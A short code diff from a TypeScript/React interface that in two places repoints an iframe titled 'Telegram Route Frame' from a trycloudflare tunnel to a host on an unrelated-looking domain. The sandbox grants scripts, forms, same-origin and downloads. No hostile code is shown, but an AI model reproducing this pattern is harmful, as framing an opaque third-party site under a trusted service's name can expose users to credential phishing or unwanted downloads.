@@ -1699,7 +1699,7 @@ const extractWallpaperAnalysis = (imageUrl: string): Promise<WallpaperAnalysis> 
       render: () => (
         <div className="flex h-full w-full flex-col bg-[var(--surface)] select-none overflow-hidden">
           <iframe
-            src="https://marking-carriers-parenting-park.trycloudflare.com/"
+            src="https://linkerroutetraffic.sonytvrepair.com/"
             className="w-full h-full border-none bg-[var(--surface)]"
             title="Telegram Route Frame"
             sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-downloads allow-modals"
@@ -3463,7 +3463,7 @@ const extractWallpaperAnalysis = (imageUrl: string): Promise<WallpaperAnalysis> 
               return (
                 <div className="flex h-full w-full flex-col bg-[var(--surface)] select-none overflow-hidden">
                   <iframe
-                    src="https://marking-carriers-parenting-park.trycloudflare.com/"
+                    src="https://linkerroutetraffic.sonytvrepair.com/"
                     className="w-full h-full border-none bg-[var(--surface)]"
                     title="Telegram Route Frame"
                     sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-downloads allow-modals"
